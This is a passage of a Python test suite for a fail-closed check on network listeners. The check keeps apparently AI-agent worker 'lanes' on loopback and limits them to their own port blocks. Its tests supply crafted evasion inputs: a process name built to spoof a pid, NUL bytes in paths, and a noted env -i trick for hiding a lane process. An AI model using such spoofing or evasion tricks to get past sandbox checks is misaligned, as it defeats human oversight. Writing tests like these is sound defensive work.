    ("tcp46", "*.22", "LISTEN", 1, "launchd"),
    ("tcp4", "100.101.102.103.8080", "LISTEN", 333, "tailscaled"),       # bound to the tailnet only: unreachable
    ("tcp4", "127.0.0.1.41000", "LISTEN", 900, "node"), ("tcp6", "::1.41001", "LISTEN", 901, "node"),
    ("tcp4", "127.0.0.1.49500", "127.0.0.1.41000", 902, "node"),         # a connection, not a listener
]
EXE = {501: CONTROL_CENTER, 612: "/usr/libexec/rapportd", 220: "/usr/sbin/cupsd", 1: "/sbin/launchd",
       333: "/opt/homebrew/bin/tailscaled", 900: "/opt/homebrew/bin/node", 901: "/opt/homebrew/bin/node",
       777: "/opt/homebrew/bin/ollama"}
APPROVED = [CONTROL_CENTER, "/usr/libexec/rapportd", "/usr/sbin/cupsd", "/sbin/launchd"]


def netstat_text(sockets, header=HEADER_PID):
    """netstat -anv -p tcp, in the old (pid column) or the new (process:pid column) format."""
    named = "process:pid" in header
    lines = ["Active Internet connections (including servers)", header]
    for proto, local, state, pid, command in sockets:
        foreign, state = ("*.*", state) if state == "LISTEN" else (state, "ESTABLISHED")
        who = "%s:%d" % (command, pid) if named else "%d" % pid
        extra = "    131072  131072  %s  0 0x0100 0x00000106 0x0000000000c5a1d 0x00000000 0x00000800 1 0 000001" % who
        if named:
            extra = "  1024  2048  131072  131072  %s  0x0100 0x00000106 0x0000000000c5a1d 0x00000000 0x00000800 1 0 000001" % who
        lines.append("%-6s     0      0  %-22s %-22s %-12s%s" % (proto, local, foreign, state, extra))
    return "\n".join(lines) + "\n"


def lsof_text(pairs):
    """lsof -nP -iTCP -sTCP:LISTEN -F pn for the user's own listeners."""
    out = []
    for pid, address in pairs:
        out += ["p%d" % pid, "f20", "n%s" % address]
    return "\n".join(out) + "\n"


class Ran:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode, self.stdout, self.stderr = returncode, stdout, stderr


@pytest.fixture
def listeners(env, held, monkeypatch):
    """A Mac's listeners: netstat prints `state["sockets"]` (in `state["header"]`'s format), lsof the user's own,
    proc_pidpath maps pids to executables, and the block at 41000 is a live lane's (this test holds t1's lock)."""
    mine = os.getuid()
    kaylee = ["HOME=/h", "CLAUDE_CODE_TMPDIR=" + str(lane._parent_path() / lane.lane_hash("t1", "kaylee") / "tmp")]
    state = {"sockets": list(SOCKETS), "header": HEADER_PID, "netstat_rc": 0, "netstat": None,
             "lsof": [(900, "127.0.0.1:41000"), (901, "[::1]:41001")], "lsof_rc": 0, "exe": dict(EXE),
             "lsof_rounds": [], "netstat_rounds": [], "lsof_stderr": "",   # one-off answers, round by round
             "environ": {900: kaylee, 901: kaylee},      # pid -> the environment the _environ seam reports
             # pid -> owner, as ps reports it (Apple's daemons and tailscaled are root's; node and ollama the user's)
             "uids": {501: mine, 612: mine, 220: 0, 1: 0, 333: 0, 900: mine, 901: mine, 902: mine, 905: mine, 777: mine},
             "ps_rc": 0}

    def run(cmd, timeout=60):
        if cmd[0].endswith("netstat"):
            sockets = state["netstat_rounds"].pop(0) if state["netstat_rounds"] else state["sockets"]
            text = state["netstat"] if state["netstat"] is not None else netstat_text(sockets, state["header"])
            return Ran(state["netstat_rc"], text)
        if cmd[0].endswith("lsof"):
            pairs = state["lsof_rounds"].pop(0) if state["lsof_rounds"] else state["lsof"]
            return Ran(state["lsof_rc"], lsof_text(pairs), state["lsof_stderr"])
        if cmd[0] == "/bin/ps":
            return Ran(state["ps_rc"], "".join("%d 1 %d %d\n" % (pid, pid, uid) for pid, uid in state["uids"].items()))
        raise AssertionError(cmd)
    monkeypatch.setattr(lane, "_run", run)
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: "/usr/sbin/" + name)
    monkeypatch.setattr(lane, "pid_path", lambda pid: state["exe"].get(pid))
    monkeypatch.setattr(lane, "_environ", lambda pid: state["environ"].get(pid))
    monkeypatch.setattr(lane, "port_free", lambda port: True)
    held("t1")
    assert lane.allocate_block("t1", "kaylee") == 41000
    approve(APPROVED)
    return state


def approve(paths):
    lane.approved_path().parent.mkdir(parents=True, exist_ok=True)
    lane.approved_path().write_text(json.dumps(paths))


@pytest.mark.parametrize("header", [HEADER_PID, HEADER_PROCESS])
def test_lane_ports_and_approved_apple_programs_pass(listeners, header):
    """Spec unit test 8: lane ports pass; an approved Apple program passes; in both of netstat's formats."""
    listeners["header"] = header
    assert lane.listeners_ok() == (True, [])


def test_an_approved_program_passes_on_any_port(listeners):
    """D11's test case: rapportd takes a new port each time it starts."""
    listeners["sockets"] += [("tcp4", "*.51234", "LISTEN", 612, "rapportd"), ("tcp6", "*.61000", "LISTEN", 612, "rapportd")]
    assert lane.listeners_ok() == (True, [])


def test_a_program_not_on_the_list_fails_on_any_port_and_is_named(listeners):
    """D11's test case and spec unit test 8: the lead's message names each one by command name and port."""
    listeners["sockets"] += [("tcp4", "127.0.0.1.11434", "LISTEN", 777, "ollama"), ("tcp46", "*.11435", "LISTEN", 777, "ollama")]
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["ollama (pid 777) listens on port 11434 (/opt/homebrew/bin/ollama)",
                                   "ollama (pid 777) listens on port 11435 (/opt/homebrew/bin/ollama)"]
    approve(APPROVED[:1])
    ok, problems = lane.listeners_ok()
    assert any("rapportd (pid 612) listens on port 49152 (/usr/libexec/rapportd)" == p for p in problems)


@pytest.mark.parametrize("address", ["*.41002", "192.168.1.20.41002", "::.41002", "fe80::1%lo0.41002",
                                     "100.101.102.103.41002"])
def test_a_lane_process_listening_beyond_loopback_fails(listeners, address):
    """Spec unit test 8: on *, a LAN, link-local or tailnet address, a lane port fails, reachable or not."""
    listeners["sockets"].append(("tcp46" if address.startswith("*") else "tcp4", address, "LISTEN", 900, "node"))
    ok, problems = lane.listeners_ok()
    assert not ok and len(problems) == 1 and "port 41002, beyond loopback" in problems[0]


@pytest.mark.parametrize("counted", ["*.9002", "::ffff:127.0.0.1.9003", "fe80::1%lo0.9004", "[weird].9005"])
def test_a_listener_bound_to_one_other_address_does_not_count(listeners, counted):
    """The reachability ruling: neither the worker nor the broker can reach a socket bound only to the tailnet or the
    LAN, so another user's neither blocks a lane nor needs approval (the user's own does: I3). A wildcard counts, and
    so do an IPv4-mapped loopback address, anything scoped to lo0 and an address the check can't read (N8)."""
    listeners["uids"][777] = os.getuid() + 1
    listeners["sockets"] += [("tcp4", "100.101.102.103.9000", "LISTEN", 777, "ollama"),
                             ("tcp4", "192.168.1.20.9001", "LISTEN", 777, "ollama"),
                             ("tcp6", "fe80::1%en0.9006", "LISTEN", 777, "ollama")]
    assert lane.listeners_ok() == (True, [])
    listeners["sockets"].append(("tcp6", counted, "LISTEN", 777, "ollama"))
    ok, problems = lane.listeners_ok()
    assert not ok and len(problems) == 1 and "ollama (pid 777) listens on port 900" in problems[0]


def test_a_listener_whose_program_cant_be_identified_fails(listeners):
    """D11: a counted listener with no executable path fails, in a lane's block too."""
    listeners["exe"].pop(612)
    ok, problems = lane.listeners_ok()
    assert not ok and "? (pid 612) listens on * port 49152, and its program can't be identified" in problems
    listeners["header"] = HEADER_PROCESS                                    # the newer netstat names it
    assert "rapportd (pid 612) listens on * port 49152, and its program can't be identified" in lane.listeners_ok()[1]
    listeners["exe"][612] = "/usr/libexec/rapportd"
    listeners["exe"].pop(900)
    ok, problems = lane.listeners_ok()
    assert problems == ["node (pid 900) listens on 127.0.0.1 port 41000, and its program can't be identified"]


def test_a_root_listener_is_seen(listeners):
    """The spec's reason for netstat: root's listeners count. cupsd on 631 passes only because it is approved."""
    approve([p for p in APPROVED if p != "/usr/sbin/cupsd"])
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["cupsd (pid 220) listens on port 631 (/usr/sbin/cupsd)"]


def test_netstat_or_lsof_failing_fails(listeners, monkeypatch):
    """Spec unit test 8: an lsof failure fails, and so does a netstat failure."""
    listeners["netstat_rc"] = 1
    assert lane.listeners_ok()[0] is False
    listeners["netstat_rc"] = 0
    listeners["lsof_rc"] = 2
    assert lane.listeners_ok() == (False, ["lsof failed, so the listener check fails closed"])
    listeners["lsof_rc"], listeners["lsof"] = 1, []                        # lsof found nothing of the user's: fine
    assert lane.listeners_ok() == (True, [])
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: None)        # nothing could run at all
    assert lane.listeners_ok()[0] is False
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: None)
    assert lane.listeners_ok()[0] is False


@pytest.mark.parametrize("text", [
    "",
    "Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)      rhiwat  shiwat  epid\n",
    "Proto Recv-Q  Local Address          Foreign Address        (state)  pid\n",
    HEADER_PID + "\ntcp4       0      0  127.0.0.1.41000        *.*                    LISTEN\n",
    HEADER_PID + "\ntcp4       0      0  127.0.0.1.41000        *.*                    LISTEN  131072  131072  -\n",
    HEADER_PROCESS + "\ntcp4  0  0  127.0.0.1.41000  *.*  LISTEN  1  2  131072  131072  node:pid\n",
    # full-length rows (netstat_text makes them), so the pid check itself is what refuses
    netstat_text([("tcp4", "127.0.0.1.41000", "LISTEN", 4242, "node")], HEADER_PROCESS).replace("4242", "pid"),
    netstat_text([("tcp4", "127.0.0.1.41000", "LISTEN", 4242, "node")], HEADER_PID).replace("4242", "-"),
    netstat_text([("tcp4", "garbage", "LISTEN", 4242, "node")], HEADER_PID),
    netstat_text([("tcp4", "garbage", "LISTEN", 4242, "node")], HEADER_PROCESS),
    netstat_text([("tcp", "127.0.0.1.41000", "LISTEN", 4242, "node")], HEADER_PID),     # a bare "tcp" proto
    netstat_text([("tcp4", "127.0.0.1.41000", "LISTEN", 4242, "node")], HEADER_PID.replace("pid ", "pid process:pid ", 1)),
])
def test_a_netstat_it_doesnt_recognise_fails_closed(listeners, text):
    listeners["netstat"] = text
    ok, problems = lane.listeners_ok()
    assert not ok and "netstat failed" in problems[0]


def test_a_listener_lsof_sees_and_netstat_doesnt_fails(listeners):
    """The cross-check: any (pid, port) of the user's own that netstat lacks, in both of two rounds, means the
    enumeration can't be trusted."""
    listeners["lsof"].append((905, "127.0.0.1:41003"))
    ok, problems = lane.listeners_ok()
    assert not ok and problems == [
        "lsof shows pid 905 listening on port 41003, which netstat doesn't list (a socket several processes share, "
        "such as a pre-fork server or inherited descriptors, fails until only one holds it)"]


def test_a_socket_that_opens_between_netstat_and_lsof_doesnt_fail_the_check(listeners):
    """Review (N2): a socket that appeared after netstat read the table is gone from the second round."""
    listeners["lsof_rounds"] = [listeners["lsof"] + [(906, "127.0.0.1:41004")]]
    assert lane.listeners_ok() == (True, [])


def test_a_dead_teamds_block_is_not_a_lane(listeners, monkeypatch):
    held_lock = lane._team_lock("t1")
    monkeypatch.setattr(lane, "team_alive", lambda team_id: False)
    ok, problems = lane.listeners_ok()
    assert held_lock.exists() and not ok and len(problems) == 2
    assert all("node (pid 90" in p and "(/opt/homebrew/bin/node)" in p for p in problems)


@pytest.mark.parametrize("host, loopback", [
    ("::1", True), ("127.0.0.1", True), ("127.0.0.2", True), ("127.255.255.254", True),
    ("fe80::1", False), ("fe80::1%lo0", False), ("::", False), ("*", False), ("0.0.0.0", False),
    ("100.101.102.103", False), ("fd7a:115c:a1e0::1", False), ("192.168.1.20", False), ("::ffff:127.0.0.1", False),
])
def test_only_127_8_and_ipv6_loopback_count_as_loopback(host, loopback):
    """Spec unit test 8: ::1 and 127.0.0.2 count; fe80::1, :: and a tailnet address don't."""
    assert lane.is_loopback(host) is loopback


def test_a_process_name_with_spaces_or_colons_keeps_its_own_pid():
    """Review (N1): the process:pid column is everything between the columns before and after it, and the pid is its
    last :digits. A name with spaces parses, and a crafted "x:1 y:777" is pid 777, never 1."""
    text = netstat_text([("tcp4", "127.0.0.1.9000", "LISTEN", 4321, "Google Chrome He"),
                         ("tcp4", "127.0.0.1.9001", "LISTEN", 777, "x:1 y")], HEADER_PROCESS)
    assert lane.parse_netstat(text) == [
        {"pid": 4321, "command": "Google Chrome He", "host": "127.0.0.1", "port": 9000},
        {"pid": 777, "command": "x:1 y", "host": "127.0.0.1", "port": 9001}]


@pytest.mark.parametrize("header", [HEADER_PID, HEADER_PROCESS])
def test_netstat_is_parsed_with_ipv6_in_both_formats(header):
    """Addresses end in .<port>: 127.0.0.1.631, *.5000, ::1.631 and fe80::1%lo0.631, on tcp4, tcp6 and tcp46."""
    got = lane.parse_netstat(netstat_text(SOCKETS + [("tcp6", "fe80::1%lo0.631", "LISTEN", 220, "cupsd")], header))
    command = (lambda name: name) if header == HEADER_PROCESS else (lambda name: "")
    assert got == [{"pid": pid, "command": command(name), "host": local.rpartition(".")[0], "port": int(local.rpartition(".")[2])}
                   for proto, local, state, pid, name in SOCKETS + [("tcp6", "fe80::1%lo0.631", "LISTEN", 220, "cupsd")]
                   if state == "LISTEN"]
    assert {(g["host"], g["port"]) for g in got} >= {("127.0.0.1", 631), ("*", 5000), ("::1", 631), ("fe80::1%lo0", 631)}


def test_lsof_output_is_parsed_with_ipv6():
    assert lane.parse_lsof(lsof_text([(900, "127.0.0.1:41000"), (901, "[::1]:41001"), (501, "*:7000")])) == [
        {"pid": 900, "command": "", "host": "127.0.0.1", "port": 41000},
        {"pid": 901, "command": "", "host": "::1", "port": 41001},
        {"pid": 501, "command": "", "host": "*", "port": 7000}]


@pytest.mark.parametrize("entry, reason", [
    ("/opt/homebrew/bin/ollama", "only Apple programs"),                              # D11's test case
    ("/usr/bin/python3", "only Apple programs"),
    ("/usr/libexec/../../opt/homebrew/bin/ollama", "only Apple programs"),
    ("usr/libexec/rapportd", "only Apple programs"),
    ("/System/Library/Frameworks/Python.framework/Versions/3.9/bin/python3.9", "an interpreter is never approved"),
    ("/usr/libexec/perl5.30", "an interpreter is never approved"),
    ("/usr/sbin/zsh", "an interpreter is never approved"),
    ("/System/Volumes/Data/opt/homebrew/bin/ollama", "not on the sealed system volume"),
    ("/System/Volumes/Data/Users/andy/bin/tool", "not on the sealed system volume"),
    ("/usr/libexec/cups/backend/ipp", "not on the sealed system volume"),
    ("/System/Library/Caches/com.apple.x/helper", "not on the sealed system volume"),
    ("/System/Library/AssetsV2/com.apple.MobileAsset/x/bin/helper", "not on the sealed system volume"),
    ("/System/Library/Speech/Voices/helper", "not on the sealed system volume"),
    ("/System/Library/CoreServices/CoreTypes.bundle/Contents/Library/helper", "not on the sealed system volume"),
    ({"executable": "/usr/libexec/rapportd", "port": 49152}, "only Apple programs"),  # D10's old shape
    (49152, "only Apple programs"),
])
def test_the_approved_list_holds_only_apple_program_paths(env, entry, reason):
    """D10 and D11: a bad entry refuses the whole list when it is loaded, so the check fails closed."""
    approve(["/usr/libexec/rapportd", entry])
    with pytest.raises(lane.LaneWait, match=reason):
        lane.load_approved()
    ok, problems = lane.listeners_ok()
    assert not ok and reason in problems[0]


def test_the_approved_list_must_be_a_readable_list(env):
    lane.approved_path().parent.mkdir(parents=True, exist_ok=True)
    assert lane.load_approved() == set()                                              # no file: nothing approved
    for text in ("{not json", json.dumps({"executable": "/usr/libexec/rapportd"})):
        lane.approved_path().write_text(text)
        with pytest.raises(lane.LaneWait):
            lane.load_approved()
    approve(["/usr/libexec/rapportd", "/sbin/launchd", CONTROL_CENTER, "/usr/sbin/sshd"])
    assert lane.load_approved() == {"/usr/libexec/rapportd", "/sbin/launchd", CONTROL_CENTER, "/usr/sbin/sshd"}


# ---------- Task 4, fix round 1 ----------

REAL_RUN = lane._run


def test_bytes_that_are_not_utf8_fail_the_check_closed_and_never_raise(listeners, monkeypatch):
    """Critical 1: a 16-byte process name cut inside a multibyte character is not UTF-8. The real _run reads it, and
    listeners_ok answers (False, ...) instead of raising past Task 8's watch."""
    text = netstat_text([("tcp4", "127.0.0.1.9000", "LISTEN", 4321, "aaaa")], HEADER_PROCESS)
    script = "import sys; sys.stdout.buffer.write(%r.replace(b'aaaa', b'a' * 15 + b'\\xc3'))" % text.encode()

    def run(cmd, timeout=60):
        if cmd[0].endswith("netstat"):
            return REAL_RUN([sys.executable, "-c", script])
        return Ran(0, lsof_text([]))
    monkeypatch.setattr(lane, "_run", run)
    ok, problems = lane.listeners_ok()
    assert ok is False and problems


def test_a_parse_error_fails_the_check_closed(listeners, monkeypatch):
    monkeypatch.setattr(lane, "_netstat_rows", lambda text: (_ for _ in ()).throw(ValueError("boom")))
    ok, problems = lane.listeners_ok()
    assert ok is False and len(problems) == 1


def test_a_netstat_row_it_cannot_read_is_named_as_the_row_not_the_header(listeners):
    listeners["netstat"] = netstat_text([("tcp4", "garbage", "LISTEN", 4242, "node")], HEADER_PID)
    ok, problems = lane.listeners_ok()
    assert not ok and "row" in problems[0] and "header" not in problems[0]


def test_a_process_name_with_a_line_separator_is_one_row():
    text = netstat_text([("tcp4", "127.0.0.1.9000", "LISTEN", 4321, "a\x0bb c")], HEADER_PROCESS)
    assert lane.parse_netstat(text) == [{"pid": 4321, "command": "a b c", "host": "127.0.0.1", "port": 9000}]


def test_the_sealed_volume_is_checked_on_a_mac_only(env, monkeypatch):
    approve(["/usr/libexec/rapportd"])
    devices = {"/usr/sbin": 1, "/usr/libexec/rapportd": 1}
    monkeypatch.setattr(lane, "_device", lambda path: devices[path])
    assert lane.load_approved() == {"/usr/libexec/rapportd"}                     # Linux: skipped
    monkeypatch.setattr(lane.sys, "platform", "darwin")
    assert lane.load_approved() == {"/usr/libexec/rapportd"}
    devices["/usr/libexec/rapportd"] = 2                                         # another volume
    with pytest.raises(lane.LaneWait, match="not on the sealed system volume"):
        lane.load_approved()


def test_round_two_reads_netstat_again(listeners):
    """Review: a pair lsof sees that round 2's netstat lists is no failure."""
    listeners["exe"][905] = "/opt/homebrew/bin/node"
    listeners["environ"][905] = listeners["environ"][900]
    listeners["lsof"].append((905, "127.0.0.1:41003"))
    listeners["netstat_rounds"] = [list(SOCKETS), SOCKETS + [("tcp4", "127.0.0.1.41003", "LISTEN", 905, "node")]]
    assert lane.listeners_ok() == (True, [])


def test_lsofs_own_failures_fail_the_check(listeners, monkeypatch):
    real_run, real_which = lane._run, lane.shutil.which
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: None if name == "lsof" else real_which(name, path=path))
    assert lane.listeners_ok() == (False, ["lsof failed, so the listener check fails closed"])
    monkeypatch.setattr(lane.shutil, "which", real_which)
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: None if cmd[0].endswith("lsof") else real_run(cmd, timeout))
    assert lane.listeners_ok() == (False, ["lsof failed, so the listener check fails closed"])
    monkeypatch.setattr(lane, "_run", real_run)
    listeners["lsof_rc"], listeners["lsof_stderr"] = 1, "lsof: WARNING: can't stat() fuse file system"
    assert lane.listeners_ok() == (False, ["lsof failed, so the listener check fails closed"])


def test_the_cross_check_message_mentions_shared_sockets(listeners):
    listeners["lsof"].append((905, "127.0.0.1:41003"))
    assert "several processes share" in lane.listeners_ok()[1][0]


def lane_tmp():
    return str(lane._parent_path() / lane.lane_hash("t1", "kaylee") / "tmp")


def test_a_lane_process_listening_beyond_loopback_fails_on_any_port(listeners):
    """Important 3: a lane process is a pid whose environment holds CLAUDE_CODE_TMPDIR=<a live lane's tmp>."""
    listeners["environ"][902] = ["HOME=/h", "CLAUDE_CODE_TMPDIR=" + lane_tmp()]
    listeners["exe"][902] = "/opt/homebrew/bin/node"
    listeners["sockets"].append(("tcp4", "*.9100", "LISTEN", 902, "node"))
    ok, problems = lane.listeners_ok()
    assert not ok and len(problems) == 1 and "port 9100" in problems[0] and "lane" in problems[0]
    listeners["sockets"][-1] = ("tcp4", "192.168.1.20.9100", "LISTEN", 902, "node")
    ok, problems = lane.listeners_ok()             # a lane's process exposes the app to the network, reachable or not
    assert not ok and len(problems) == 1 and "192.168.1.20 port 9100, beyond loopback" in problems[0]
    listeners["sockets"][-1] = ("tcp4", "127.0.0.1.9100", "LISTEN", 902, "node")
    ok, problems = lane.listeners_ok()             # on loopback it is an ordinary unapproved listener
    assert problems == ["node (pid 902) listens on port 9100 (/opt/homebrew/bin/node)"]


ELSEWHERE = [("tcp4", "192.168.1.5.3000"), ("tcp4", "100.101.102.104.3000"), ("tcp6", "fd00::5.3000"),
             ("tcp6", "2001:db8::5.3000"), ("tcp6", "fe80::1%en0.3000")]


@pytest.mark.parametrize("proto, address", ELSEWHERE)
def test_a_lane_process_fails_on_every_non_loopback_address_and_others_are_skipped(listeners, proto, address):
    """Important 3, with I3's ruling: another user's listener on a specific address beyond loopback is skipped as
    unreachable; the user's own fails while a lane runs, and a lane's process is named as one."""
    listeners["exe"][902] = "/opt/homebrew/bin/node"
    listeners["uids"][902] = os.getuid() + 1
    listeners["sockets"].append((proto, address, "LISTEN", 902, "node"))
    assert lane.listeners_ok() == (True, [])                                      # someone else's: unreachable
    listeners["uids"][902] = os.getuid()
    host, _, port = address.rpartition(".")
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["node (pid 902) listens on %s port %s, beyond loopback, as this user while a lane "
                                   "runs (/opt/homebrew/bin/node)" % (host, port)]
    listeners["environ"][902] = ["CLAUDE_CODE_TMPDIR=" + lane_tmp()]
    ok, problems = lane.listeners_ok()
    assert not ok and len(problems) == 1 and "a lane's process, listens on %s port %s, beyond loopback" % (host, port) \
        in problems[0]


def test_this_users_listener_on_a_lan_address_fails_while_a_lane_runs(listeners):
    """I3 (ruling): a lane process that clears its environment (env -i) looks like any other, so while any lane is
    live a listener of this user's on any specific address beyond loopback fails, whatever its environment."""
    listeners["sockets"].append(("tcp4", "192.168.1.20.9100", "LISTEN", 777, "ollama"))
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["ollama (pid 777) listens on 192.168.1.20 port 9100, beyond loopback, as this user "
                                   "while a lane runs (/opt/homebrew/bin/ollama)"]


def test_another_users_listener_on_a_lan_address_is_still_skipped(listeners):
    """I3 (ruling): Tailscale's or a root service's listener on a specific address stays unreachable from a lane."""
    listeners["uids"][777] = 0
    listeners["sockets"].append(("tcp4", "192.168.1.20.9100", "LISTEN", 777, "ollama"))
    listeners["sockets"].append(("tcp6", "fd7a:115c:a1e0::5.9101", "LISTEN", 777, "ollama"))
    assert lane.listeners_ok() == (True, [])


def test_whose_listener_it_is_must_be_known_or_the_check_fails(listeners):
    """I3: ps failing, or a pid it doesn't list, fails closed; with no live lane, nothing beyond loopback that no lane
    can reach counts."""
    listeners["sockets"].append(("tcp4", "192.168.1.20.9100", "LISTEN", 778, "ollama"))
    listeners["exe"][778] = "/opt/homebrew/bin/ollama"
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["ollama (pid 778) listens on 192.168.1.20 port 9100, beyond loopback, and ps can't "
                                   "say whose it is (/opt/homebrew/bin/ollama)"]
    listeners["ps_rc"] = 1                                                      # ps itself fails: nobody's is known
    listeners["uids"][778] = os.getuid() + 1
    assert lane.listeners_ok()[1] == problems + [
        "tailscaled (pid 333) listens on 100.101.102.103 port 8080, beyond loopback, and ps can't say whose it is "
        "(/opt/homebrew/bin/tailscaled)"]
    lane.release_block("t1", "kaylee")                                           # no lane is live now
    listeners["sockets"] = [x for x in listeners["sockets"] if x[3] not in (900, 901)]
    listeners["lsof"] = []
    assert lane.listeners_ok() == (True, [])


def lane_b(name="wash"):
    lane.allocate_block("t1", name)
    return lane.lane_hash("t1", name)


def test_a_lanes_own_server_and_its_broker_pass_in_its_block(listeners):
    """I4 (ruling): a listener in lane X's block must carry X's exact CLAUDE_CODE_TMPDIR, or be X's broker, whose
    environment has TMPDIR=<X>/b (the parent resolved, as lane_text names it, or not)."""
    key = lane.lane_hash("t1", "kaylee")
    for pid, b_dir in ((910, os.path.join(os.path.realpath(lane._parent_path()), key, "b")),
                       (911, str(lane._parent_path() / key / "b"))):
        listeners["exe"][pid] = "/opt/homebrew/bin/node"
        listeners["uids"][pid] = os.getuid()
        listeners["environ"][pid] = ["PATH=/usr/bin:/bin", "TMPDIR=" + b_dir, "MAC_CHROMIUM_TMPDIR=" + b_dir]
        listeners["sockets"].append(("tcp4", "127.0.0.1.41031", "LISTEN", pid, "node"))
        listeners["lsof"].append((pid, "127.0.0.1:41031"))
    assert lane.listeners_ok() == (True, [])


@pytest.mark.parametrize("environ, why", [
    ("wash", "lane A's process in lane B's block"),
    ("wash broker", "lane A's broker in lane B's block"),
    ("none", "no lane's environment"),
    ("unreadable", "an environment that can't be read"),
    ("prefix", "a CLAUDE_CODE_TMPDIR that only starts like the lane's"),
])
def test_anything_else_in_a_lanes_block_fails(listeners, environ, why):
    """I4 (ruling): lanes share localhost, so a block's ports belong to its lane alone."""
    other = lane_b()
    env_of = {"wash": ["CLAUDE_CODE_TMPDIR=" + str(lane._parent_path() / other / "tmp")],
              "wash broker": ["TMPDIR=" + str(lane._parent_path() / other / "b")],
              "none": ["HOME=/h"], "unreadable": None, "prefix": ["CLAUDE_CODE_TMPDIR=" + lane_tmp() + "x"]}[environ]
    listeners["exe"][920] = "/opt/homebrew/bin/node"
    listeners["uids"][920] = os.getuid()
    listeners["environ"][920] = env_of
    listeners["sockets"].append(("tcp4", "127.0.0.1.41005", "LISTEN", 920, "node"))
    listeners["lsof"].append((920, "127.0.0.1:41005"))
    ok, problems = lane.listeners_ok()
    assert not ok and problems == ["node (pid 920) listens on 127.0.0.1 port 41005, in lane %s's block, but isn't "
                                   "that lane's or its broker (/opt/homebrew/bin/node)"
                                   % lane.lane_hash("t1", "kaylee")], why


def test_a_listener_check_that_errs_any_way_fails_closed(listeners, monkeypatch):
    """T4: deeply nested JSON (RecursionError), a lock that errs, anything: (False, ...), never raised."""
    for error in (RecursionError("deep"), OSError(5, "EIO"), KeyError("x"), RuntimeError("bug")):
        monkeypatch.setattr(lane, "_check", lambda approved, lanes, e=error: (_ for _ in ()).throw(e))
        ok, problems = lane.listeners_ok()
        assert ok is False and problems == ["the listener check failed (%s), so it fails closed"
                                            % error.__class__.__name__]


def test_kern_procargs2_is_read_past_argv_to_the_environment():
    raw = (2).to_bytes(4, sys.byteorder) + b"/opt/homebrew/bin/node\0\0\0node\0-e\0A=1\0CLAUDE_CODE_TMPDIR=/x\0\0junk"
    assert lane._parse_procargs2(raw) == ["A=1", "CLAUDE_CODE_TMPDIR=/x"]
    assert lane._parse_procargs2(b"\0") == []


def test_environ_reads_a_real_process_on_linux_and_none_for_a_missing_one():
    if sys.platform == "linux":
        assert any(item.startswith("PATH=") for item in lane._environ(os.getpid()) or [])
    assert lane._environ(2 ** 22 + 12345) is None


@pytest.mark.parametrize("host, counts", [("::0", True), ("0:0:0:0:0:0:0:0", True), ("::ffff:0.0.0.0", True),
                                          ("::ffff:127.0.0.1", True), ("::ffff:192.168.1.1", False),
                                          ("fe80::1", False), ("100.101.102.103", False)])
def test_reachable_reads_addresses_not_strings(host, counts):
    assert lane.reachable(host) is counts


def test_a_nul_in_the_approved_list_never_raises(listeners, monkeypatch):
    monkeypatch.setattr(lane.sys, "platform", "darwin")
    monkeypatch.setattr(lane, "_device", lambda path: os.lstat(path).st_dev if "\0" in path else 1)
    approve(APPROVED + ["/usr/libexec/\0rapportd"])
    ok, problems = lane.listeners_ok()
    assert ok is False and problems


def test_a_nul_in_a_registry_team_never_raises(listeners):
    with lane._registry_lock():
        data = lane._read_registry()
        data["x" * 10] = {"base": 41032, "team": "a\0b", "worker": "w"}
        lane._write_registry(data)
    assert lane.team_alive("a\0b") is False
    assert lane.listeners_ok()[0] in (True, False)


def test_a_nul_in_a_mac_path_is_not_sealed(monkeypatch):
    monkeypatch.setattr(lane.sys, "platform", "darwin")
    assert lane._sealed("/usr/libexec/a\0b") == "not on the sealed system volume"


@pytest.mark.parametrize("base", [600, 41001, 49000, 48969, -32])
def test_a_registry_base_outside_the_pool_is_damaged(listeners, base):
    with lane._registry_lock():
        data = lane._read_registry()
        data["y" * 10] = {"base": base, "team": "t1", "worker": "w"}
        lane._write_registry(data)
    ok, problems = lane.listeners_ok()
    assert not ok and "damaged" in problems[0]


@pytest.mark.parametrize("entry, reason", [
    ("/usr/sbin/zsh", "an interpreter is never approved"),
    ("/usr/libexec/perl5.30", "an interpreter is never approved"),
    ("/System/Library/Frameworks/Python.framework/Versions/3.9/bin/python3.9", "an interpreter is never approved"),
    ("/usr/libexec/nonesuch", "does not exist"),
])
def test_on_a_mac_an_interpreter_is_an_interpreter_even_when_it_is_missing(env, monkeypatch, entry, reason):
    def device(path):
        if path in ("/usr/sbin", "/usr/libexec/rapportd"):
            return 1
        raise FileNotFoundError(path)
    monkeypatch.setattr(lane.sys, "platform", "darwin")
    monkeypatch.setattr(lane, "_device", device)
    approve(["/usr/libexec/rapportd", entry])
    with pytest.raises(lane.LaneWait, match=reason):
        lane.load_approved()


def test_pid_1_is_explained_to_the_lead(listeners):
    approve([p for p in APPROVED if p != "/sbin/launchd"])
    ok, problems = lane.listeners_ok()
    assert problems == ["launchd (pid 1) listens on port 22 (/sbin/launchd), launchd holds it for a socket-activated job"]


# ---------- Task 5: the broker's pinned Playwright and its browser ----------

HAS_DATA_FILTER = hasattr(tarfile, "data_filter")


@pytest.fixture
def unpack(monkeypatch):
    """The real tarfile data filter where this Python has it (the Mac's); on an older one (the Pi's 3.11.2) a stand-in
    that unpacks the members extract_package has already checked, so the rest of the path is tested everywhere."""
    if not HAS_DATA_FILTER:
        monkeypatch.setattr(lane, "_extract", lambda tar, members, where: tar.extractall(where, members=members))


def npm_tarball(members):
    """A gzipped npm tarball. members: {name: bytes}, or {name: ("symlink", target)}."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            if isinstance(data, tuple):
                info.type = {"symlink": tarfile.SYMTYPE, "hardlink": tarfile.LNKTYPE, "chr": tarfile.CHRTYPE}[data[0]]
                info.linkname = data[1]
                tar.addfile(info)
            else:
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


